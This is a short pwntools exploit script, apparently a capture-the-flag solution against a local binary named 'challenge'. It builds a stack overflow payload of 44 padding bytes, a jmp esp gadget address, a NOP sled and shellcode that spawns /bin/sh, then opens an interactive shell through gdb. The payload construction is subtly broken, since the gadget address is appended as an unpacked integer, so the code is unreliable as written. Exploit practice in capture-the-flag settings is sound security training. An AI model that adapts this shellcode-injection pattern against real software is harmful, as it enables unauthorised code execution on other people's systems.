#!/usr/bin/env python3
from pwn import *
context(arch='i386', os='linux')
#context.terminal = ['zsh', '-e', 'sh', '-c']

def pwn():
    
    # Get jmp_esp function 0x0000118d
    e = ELF("./challenge")
    jmp_esp = e.symbols["oh_look_useful"]
    log.info("Found jmp esp at %#x" % jmp_esp)
    
    #jmp_esp = p32(0x0000119a)
    
    nops = asm(shellcraft.nop()) * 10
        
    payload = b'A' * 44 + jmp_esp + nops + asm(shellcraft.sh()) + b'\n'
     
    gdb_script = """continue"""
    io = gdb.debug('./challenge', gdbscript=gdb_script)
    io.sendline(payload)    
    io.recvuntil('\n')
    io.interactive()
    
    
if __name__ == '__main__':
    pwn()
